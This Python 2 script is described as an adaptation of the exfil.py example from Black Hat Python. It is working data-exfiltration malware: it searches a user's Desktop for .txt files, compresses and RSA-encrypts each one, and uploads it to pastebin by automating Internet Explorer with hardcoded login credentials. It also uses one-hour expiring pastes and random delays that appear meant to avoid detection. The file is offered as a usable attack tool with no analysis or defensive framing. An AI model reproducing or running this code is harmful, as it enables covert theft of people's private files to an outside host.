#A modified version of exfil.py from Black Hat Python
#Works with pastebin instead of tumblr

import win32com.client
import os
import fnmatch
import time
import random
import zlib
import sys

from Crypto.PublicKey import RSA
from Crypto import Random


doc_type   = ".txt"
username   = "username"
password   = "password"

public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyXUTgFoL/2EPKoN31l5T
lak7VxhdusNCWQKDfcN5Jj45GQ1oZZjsECQ8jK5AaQuCWdmEQkgCEV23L2y71G+T
h/zlVPjp0hgC6nOKOuwmlQ1jGvfVvaNZ0YXrs+sX/wg5FT/bTS4yzXeW6920tdls
2N7Pu5N1FLRW5PMhk6GW5rzVhwdDvnfaUoSVj7oKaIMLbN/TENvnwhZZKlTZeK79
ix4qXwYLe66CrgCHDf4oBJ/nO1oYwelxuIXVPhIZnVpkbz3IL6BfEZ3ZDKzGeRs6
YLZuR2u5KUbr9uabEzgtrLyOeoK8UscKmzOvtwxZDcgNijqMJKuqpNZczPHmf9cS
1wIDAQAB
-----END PUBLIC KEY-----"""


def wait_for_browser(browser):

	while browser.ReadyState != 4 and browser.ReadyState != "complete":    
		time.sleep(0.1)

	return

def encrypt_string(plaintext):
	chunk_size = 256

	print "Compressing: %d bytes" % len(plaintext)

	plaintext = zlib.compress(plaintext)

	print "Encrypting %d bytes" % len(plaintext)

	rsakey = RSA.importKey(public_key)

	encrypted = ""
	offset    = 0

	while offset < len(plaintext):

		chunk = plaintext[offset:offset+256]

		if len(chunk) % chunk_size != 0:
			chunk += " " * (chunk_size - len(chunk))

		encrypted += str(rsakey.encrypt(chunk,32))
		offset    += chunk_size


	encrypted = encrypted.encode("base64")
	print "Base64 encoded crypto: %d" % len(encrypted)
	return encrypted

def encrypt_post(filename):

	fd = open(filename,"rb")
	contents = fd.read()
	fd.close()

	encrypted_title = encrypt_string(filename)
	encrypted_body  = encrypt_string(contents)


	return encrypted_title,encrypted_body

def random_sleep():
	time.sleep(random.randint(5,10))
	return

def login_to_pastebin(ie):
	full_doc = ie.Document.all
	
	for i in full_doc:
		if i.getAttribute("name") == "user_name":
			i.setAttribute("value",username)
		elif i.getAttribute("name") == "user_password":
			i.setAttribute("value",password)
		else:
			continue

	random_sleep()

	try:
		if ie.Document.forms[0].id == "myform":
			ie.Document.forms[0].submit()
		else:
			ie.Document.forms[1].submit()
	except IndexError, e:
		pass

	random_sleep()

	wait_for_browser(ie)

	return

def post_to_pastebin(ie,title,post):

	full_doc = ie.Document.all

	for i in full_doc:
		if i.getAttribute("name") == "paste_name":
			i.setAttribute("value",title)
			title_box = i
			i.focus()
		elif i.id == "paste_code":	
			i.setAttribute("innerHTML",post)
			print "Set text area"
			i.focus()
		elif i.getAttribute("name") == "paste_expire_date":
			i.setAttribute("value", "1H")
			print "Set expire date"
			i.focus()
		elif i.id == "submit":
			print "Found post button"
			post_form = i
			i.focus()
		else:
			continue
			
	random_sleep()
	title_box.focus()
	random_sleep()

	post_form.children[0].click()
	post_form.click()
	wait_for_browser(ie)

	random_sleep()

	return

def exfiltrate(document_path):

	ie = win32com.client.Dispatch("InternetExplorer.Application")
	ie.Visible = 1

	ie.Navigate("pastebin.com/login")
	wait_for_browser(ie)

	print "Logging in..."
	login_to_pastebin(ie)
	print "Logged in...navigating"

	ie.Navigate("pastebin.com")
	wait_for_browser(ie)

	title,body = encrypt_post(document_path)

	print "Creating new post..."
	post_to_pastebin(ie,title,body)
	print "Posted!"

	ie.Quit()
	ie = None

	return

	
for parent, directories, filenames in os.walk("C:\\Users\\IEUser\\Desktop"):
	for filename in fnmatch.filter(filenames,"*%s" % doc_type):
		document_path = os.path.join(parent,filename)
		print "Found: %s" % document_path
		exfiltrate(document_path)
raw_input("Continue?")
